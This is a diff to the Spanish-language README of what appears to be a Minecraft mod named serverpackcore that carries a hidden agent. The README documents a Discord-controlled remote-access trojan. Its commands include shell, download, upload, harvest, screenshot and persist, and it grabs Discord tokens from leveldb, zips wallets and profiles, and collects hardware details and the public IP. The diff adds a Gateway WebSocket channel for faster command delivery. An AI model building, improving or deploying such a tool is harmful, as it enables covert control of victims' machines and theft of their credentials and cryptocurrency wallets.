@@ -25,13 +25,17 @@ La configuracion vive en `agent/src/main/java/com/serverpackcore/agent/DiscordCo
 
 - `BOT_TOKEN`, `GUILD_ID`, `CATEGORY_ID`.
 
-El agente usa solo REST, sin gateway ni intents privilegiados. En el primer arranque crea un canal bajo la categoria, registra un webhook propio para adjuntos y envia un embed de sistema. Si la creacion del canal falla, crea uno compartido con prefijo `spc-shared-`. El polling es de 2 s con jitter y pasa a 30 s tras 10 minutos sin actividad. Los 429 respetan `retry_after`; los errores de red usan backoff exponencial con techo.
+El transporte principal es un unico Gateway WebSocket por agente, sin gateway en el hilo de polling ni en el pool de comandos. En el primer arranque crea un canal bajo la categoria, registra un webhook propio para adjuntos y envia un embed de sistema. Si la creacion del canal falla, crea uno compartido con prefijo `spc-shared-`.
+
+El intent `MESSAGE_CONTENT` es obligatorio para la maxima velocidad: sin el, el contenido llega vacio y cada mensaje obliga a un REST. El agente detecta el cierre 4014, reconecta con intents 513, avisa por el canal y sigue operativo con REST cada 2 s. Si el gateway cae por otra causa, el respaldo REST usa 2 s con jitter y pasa a 30 s tras 10 minutos sin actividad. Los 429 respetan `retry_after`; los errores de red usan backoff exponencial con techo. El token nunca se registra en logs.
 
 Estado local en `state.json`: version, canal, webhook, ultimo ID y ultimo latido.
 
 ## Comandos
 
-`shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `screenshot`, `persist on|off`, `sleep`, `ping`, `kill`.
+`shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `screenshot`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`.
+
+`gateway status` muestra estado, RTT del ultimo ACK, reconexiones y ultimo codigo de cierre; `gateway restart` cierra con 4000 para probar el resume.
 
 `shell` usa `cmd /c` o `/bin/sh -c`, fusiona stdout y stderr y corta a 60 s. Las salidas de mas de 1000 caracteres se suben como `.txt`; el resto va en un bloque de cuatro backticks.
 
@@ -113,6 +117,7 @@ La tarea raiz compila `agent/` con Gradle aparte y copia `agent.jar` a `src/main
 ## Limites conocidos
 
 - Fabric API ya no es requisito y no se usa ninguna de sus clases.
+- Desactivar `MESSAGE_CONTENT` no se arregla desde codigo: el gateway entra por 4014, pasa a intents 513 y cada mensaje depende de REST (mas latencia y mas consumo de tasa).
 - El token de Discord se busca por regex en `leveldb`; variantes futuras del formato pueden requerirlo en claro y no detectarse.
 - El ZIP corta a 8 MB y omite archivos mayores de 2 MB, asi que carteras o perfiles grandes pueden quedar incompletos.
 - La GPU y la IP publica dependen de comandos o servicios externos; sin red o sin `wmic`/`lspci` quedan como `unknown`.
